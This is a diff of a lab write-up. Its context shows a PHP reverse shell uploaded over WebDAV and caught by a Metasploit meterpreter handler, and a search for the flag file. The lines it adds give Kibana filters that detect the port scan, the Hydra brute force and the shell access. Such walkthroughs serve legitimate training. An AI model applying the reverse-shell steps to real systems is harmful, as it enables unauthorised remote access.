@@ -88,7 +88,7 @@ Now, we can drag and drop the file in the WebDav folder, so we can access it lat
 
 ![webdav2](https://user-images.githubusercontent.com/90374994/155539922-532ce74a-d5c3-498c-8241-f787deb823da.png)
 
-NOTE: before accessing the shell.php from the web browser, we first need to start a listener on our machine. Once the listener is up an running we can simply navigate to the shell.php page and we will achieve remote code execution.
+>NOTE: before accessing the shell.php from the web browser, we first need to start a listener on our machine. Once the listener is up an running we can simply navigate to the shell.php page and we will achieve remote code execution.
 
 Metasploit Console
 
@@ -105,14 +105,14 @@ use exploit/multi/handler
 set payload php/meterpreter/reverse_tcp
 '''
 
-Before we run the exploit, we have to set the LHOST. We can see this by running the "options" command. We will notice port 4444 is the default port and is already set, mathcing the php reverse shell we created above. To set the LHOST and start the session we run the following:
+Before we run the exploit, we have to set the LHOST. We can see this by running the "options" command. We can notice port 4444 is the default port, and is already set, mathcing the php reverse shell we created above. To set the LHOST and start the session, we run the following:
 
 '''bash
 set LHOST 192.168.1.90
 run
 '''
 
-Now, we can navigate to http://192.168.1.105/webdav/shell.php to start the reverse shell. If everything was executed correctly, we should get reverse shell connection on our Kali machine:
+Now, we can navigate to http://192.168.1.105/webdav/shell.php to start the reverse shell. If everything was executed correctly, we should get a meterpreter shell on our Kali machine:
 
 ![metasploit listener](https://user-images.githubusercontent.com/90374994/156852952-9242a9d5-bd04-4ac3-a863-0c95acbd95a9.png)
 
@@ -124,7 +124,7 @@ find / -name flag.txt 2>/dev/null
 
 ![Screen Shot 2022-02-15 at 18 51 59 PM](https://user-images.githubusercontent.com/90374994/156853571-5cc65352-fdca-428f-a479-374bbfbe777a.png)
 
-This will look for any files named "flag.txt", ignoring any access errors it encounters while searching.
+This will look for any files named "flag.txt", ignoring any access errors it encounters, while searching.
 
 Flag found:
 
@@ -135,5 +135,66 @@ Flag found:
 
 >During this phase, we will be able to see and analyze logs, generated from the activities above. The logs were generated using FileBeat, MetricBeat and PacketBeat, and we will leverage Kibana, to analyze them.
 
-Once we fire up Kibana from our Windows host machine 
+Once we fire up Kibana from our Windows host machine (Navigate to to http://192.168.1.105:5601), we will need to add the log data to be analyzed.
+
+Logs to be added:
+
+1. Apache Logs
+2. System Logs
+3. Apache Metrics
+4. System Metrics
+
+>Note: Once the logs and metric data are added, click "Check data" at the bottom and make sure you get a message saying "Data successfully received from this module":
+
+<img width="833" alt="adding_logs" src="https://user-images.githubusercontent.com/90374994/156855428-2abd65c3-e761-4f5e-9ea0-c594ddd4e28e.png">
+
+<img width="797" alt="adding_logs2" src="https://user-images.githubusercontent.com/90374994/156855536-75a8abbb-7bc4-4683-879c-61ec9657d342.png">
+
+>NOTE: you might need to restart your browser once data is added to continue.
+
+
+Next step is to create a Kibana Dashboard. For this step we will need to add several reports to our dashboard by navigating to Dashboards > Create Dashboard (upper right hand side) > Add an existing.
+
+Search for the following panels and add them to the dashboard:
+
+1.	HTTP status codes for the top queries [Packetbeat] ECS
+2.	Top 10 HTTP requests [Packetbeat] ECS
+3.	Network Traffic Between Hosts [Packetbeat Flows] ECS
+4.	Top Hosts Creating Traffic [Packetbeat Flows] ECS
+5.	Connections over time [Packetbeat Flows] ECS
+6.	HTTP error codes [Packetbeat] ECS
+7.	Errors vs successful transactions [Packetbeat] ECS
+8.	HTTP Transactions [Packetbeat] ECS
+
+
+Now, we are ready to dig in, and find the log events we are looking for.
+
+Navigate to the "Discover" tab and change the filter dropdown to "packetbeat" as this is where the logs will be located.
+
+
+First, let's identify the port scan. We can filter for "source.ip:192.168.1.90 AND destination.ip:192.168.1.105 and destination.bytes<60"
+
+![nmap_logs](https://user-images.githubusercontent.com/90374994/156856616-20b7c9ef-a0b5-4a42-9bfa-4df758defbf3.png)
+
+We can tell there was a port scan done due to the spike in traffic, generated at 18:26. To further narrow the results, we can search for packets of under 60 bytes in size, as that should cover most port scans. 
+
+
+Second, let's find when the attacker accessed the Hidden Folder. We can use the following filter "source.ip:192.168.1.90 AND destination.ip:192.168.1.105 and url.path:"/company_folders/secret_folder/"
+
+![secret_folder](https://user-images.githubusercontent.com/90374994/156857450-7bded495-44fd-4b83-a789-2bdbe97d1e60.png)
+
+This shows the folder was accessed twice from the browser. We can further look into how many times Hydra attempted to Brute Force the login by using the following filter "source.ip:192.168.1.90 AND destination.ip:192.168.1.105 and user_agent.original:"Mozilla/4.0 (Hydra)"
+
+![secret_folder_hydra](https://user-images.githubusercontent.com/90374994/156857691-e856c7f7-4fbd-4a7b-80b1-e26cadc7ebcb.png)
+
+Here, we can see there were 17,866 brute force attempts made to find the correct password for ashton's account
+
+
+Third, let's look at the WebDAV connection logs. We can apply the following filter: "source.ip:192.168.1.90 AND destination.ip:192.168.1.105 and url.full:"http://192.168.1.105/webdav/"" and we can further narrow it down to when the shell.php was accessed by changing the URL in the search bar: "url.full:"http://192.168.1.105/webdav/shell.php""
+
+
+
+
+
+
 
